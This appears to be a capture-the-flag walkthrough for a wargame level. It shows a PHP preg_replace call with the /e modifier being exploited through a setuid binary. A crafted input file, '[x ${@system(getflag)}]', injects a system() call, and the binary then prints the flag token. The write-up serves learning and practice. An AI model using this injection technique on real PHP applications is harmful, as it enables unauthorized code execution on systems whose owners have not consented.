# Level06
## Step by step
### 1. Locate files in `level06` home directory
  ```bash
  > ls -la
  -rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
  -rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
  ```

---

### 2. Analyze the `level06.php` file
The `level06.php` file contains PHP code. It uses the `preg_replace()` function with the `/*/e` flag, which allows arbitrary code execution. This makes it unsafe and exploitable.

---

### 3. Exploit the `level06` executable
The `level06` executable uses the `level06.php` file to process input. To exploit this, create a malicious input file:

  ```bash
  > cat <<'hey' >/tmp/test
  > [x ${@system(getflag)}]
  > hey

  > ./level06 /tmp/test flag06
  Check flag.Here is your token : XXX
  ```
